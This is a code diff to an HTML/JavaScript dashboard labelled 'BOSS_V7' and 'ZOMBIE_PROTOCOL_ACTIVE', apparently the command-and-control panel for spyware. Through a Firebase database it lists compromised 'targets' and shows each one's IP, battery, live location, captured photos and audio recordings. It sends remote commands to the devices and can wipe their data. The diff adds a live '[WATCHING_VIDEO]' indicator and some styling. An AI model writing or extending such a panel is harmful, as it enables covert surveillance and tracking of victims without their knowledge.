@@ -16,8 +16,15 @@
         .node-item { border: 1px solid #222; padding: 15px; margin-bottom: 10px; cursor: pointer; position: relative; transition: 0.3s; }
         .node-item:hover { border-color: var(--neon); background: rgba(0, 255, 65, 0.05); }
         .node-item.active { border-color: var(--neon); background: rgba(0, 255, 65, 0.1); box-shadow: inset 0 0 10px rgba(0,255,65,0.2); }
+        
+        /* Status Indicators */
         .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 8px; background: #444; }
         .online { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
+        .live-tag { font-size: 9px; color: var(--neon); font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        /* Custom Red Text */
+        .protocol-red { color: var(--red) !important; font-weight: bold; text-shadow: 0 0 5px var(--red); }
 
         /* Main Content */
         .main-content { flex: 1; display: flex; flex-direction: column; background: var(--bg); position: relative; }
@@ -35,7 +42,6 @@
         .box { background: var(--panel); border: 1px solid #222; padding: 15px; position: relative; }
         .box h3 { margin-top: 0; font-size: 14px; border-bottom: 1px solid #222; padding-bottom: 10px; color: #aaa; }
 
-        /* Image & Audio Feed */
         .feed { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
         .media-card { background: #000; border: 1px solid #222; padding: 5px; text-align: center; position: relative; }
         .media-card img { width: 100%; height: auto; border: 1px solid #111; }
@@ -43,7 +49,6 @@
         .action-link { font-size: 10px; color: var(--neon); text-decoration: none; border: 1px solid #333; padding: 2px 5px; }
         .del-btn { color: var(--red); cursor: pointer; background: none; border: 1px solid #333; font-size: 10px; }
 
-        /* Rename Input */
         .rename-container { display: flex; gap: 5px; }
         .name-input { background: #000; border: 1px solid #333; color: var(--neon); padding: 5px; width: 150px; }
 
@@ -54,11 +59,10 @@
 
     <div class="sidebar">
         <div class="sidebar-header">
-            <h2 style="margin:0; color:var(--neon); font-size:18px;">BOSS_V7</h2>
-            <small style="color:#555;">ZOMBIE_PROTOCOL_ACTIVE</small>
+            <h2 style="margin:0; color:var(--neon); font-size:18px;">BOSS_V7 <span class="protocol-red" style="font-size:10px;">SRV_2285</span></h2>
+            <small class="protocol-red">ZOMBIE_PROTOCOL_ACTIVE</small>
         </div>
-        <div class="node-list" id="node-list">
-            </div>
+        <div class="node-list" id="node-list"></div>
     </div>
 
     <div class="main-content" id="main-ui" style="display:none;">
@@ -96,13 +100,12 @@
     </div>
 
 <script>
-    // --- FIREBASE INITIALIZATION ---
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     let selectedNode = null;
 
-    // --- NODE LIST SYNC ---
+    // --- REAL-TIME NODE LIST SYNC ---
     db.ref('targets').on('value', snap => {
         const list = document.getElementById('node-list');
         list.innerHTML = "";
@@ -110,39 +113,38 @@
             const id = child.key;
             const data = child.val();
             const displayName = data.customName || id;
+            
+            // Check online status based on presence of info or status
             const isOnline = data.info ? "online" : "";
+            const isWatching = (data.info && data.info.status === "ONLINE") ? "<span class='live-tag'>[WATCHING_VIDEO]</span>" : "";
             
             list.innerHTML += `
                 <div class="node-item ${selectedNode == id ? 'active' : ''}" onclick="selectNode('${id}')">
                     <span class="status-dot ${isOnline}"></span>
-                    <strong>${displayName}</strong><br>
+                    <strong>${displayName}</strong> ${isWatching}<br>
                     <small style="color:#555; font-size:10px;">${id}</small>
                 </div>`;
         });
     });
 
-    // --- TARGET SELECTION ---
     function selectNode(id) {
         selectedNode = id;
         document.getElementById('main-ui').style.display = 'flex';
         
-        // Load Custom Name
         db.ref(`targets/${id}/customName`).once('value', s => {
             document.getElementById('target-name-input').value = s.val() || id;
         });
 
-        // Load Stats/Logs
         db.ref(`targets/${id}/info`).on('value', s => {
             const info = s.val() || {};
             document.getElementById('log-content').innerHTML = `
                 IP_ADDRESS: <span style="color:#fff;">${info.ip || '---'}</span><br>
                 BATTERY: <span style="color:#fff;">${info.battery || '---'}</span><br>
-                STATUS: <span style="color:#fff;">${info.status || '---'}</span><br>
+                STATUS: <span style="color:#fff;">${info.status || 'OFFLINE'}</span><br>
                 LAST_ACTIVITY: <span style="color:#fff;">${info.time || '---'}</span>
             `;
         });
 
-        // Load Map
         db.ref(`targets/${id}/location`).on('value', s => {
             const loc = s.val();
             if(loc) {
@@ -152,13 +154,11 @@
             }
         });
 
-        // Load Media Feed (Photos & Audio)
         db.ref(`targets/${id}`).on('value', s => {
             const data = s.val() || {};
             const feed = document.getElementById('intel-feed');
             feed.innerHTML = "";
 
-            // Photos
             if(data.photos) {
                 Object.keys(data.photos).reverse().forEach(pId => {
                     const photo = data.photos[pId];
@@ -174,7 +174,6 @@
                 });
             }
 
-            // Audios
             if(data.audios) {
                 Object.keys(data.audios).reverse().forEach(aId => {
                     const audio = data.audios[aId];
@@ -182,7 +181,7 @@
                         <div class="media-card" style="padding:10px;">
                             <audio src="${audio.data}" controls style="width:100%; height:30px;"></audio>
                             <div class="card-actions">
-                                <button class="del-btn" onclick="deleteItem('audios/${aId}')">DELETE RECORDING</button>
+                                <button class="del-btn" onclick="deleteItem('audios/${aId}')">DELETE</button>
                             </div>
                         </div>`;
                 });
@@ -190,24 +189,18 @@
         });
     }
 
-    // --- COMMANDS ---
     function sendCommand(action) {
         if(!selectedNode) return;
         db.ref(`commands/${selectedNode}`).set({ action: action, ts: Date.now() });
-        alert("Command Sent: " + action);
     }
 
     function saveCustomName() {
         const newName = document.getElementById('target-name-input').value;
-        if(selectedNode) {
-            db.ref(`targets/${selectedNode}/customName`).set(newName);
-        }
+        if(selectedNode) db.ref(`targets/${selectedNode}/customName`).set(newName);
     }
 
     function deleteItem(path) {
-        if(confirm("Confirm Deletion?")) {
-            db.ref(`targets/${selectedNode}/${path}`).remove();
-        }
+        if(confirm("Confirm Deletion?")) db.ref(`targets/${selectedNode}/${path}`).remove();
     }
 
     function wipeTargetData() {
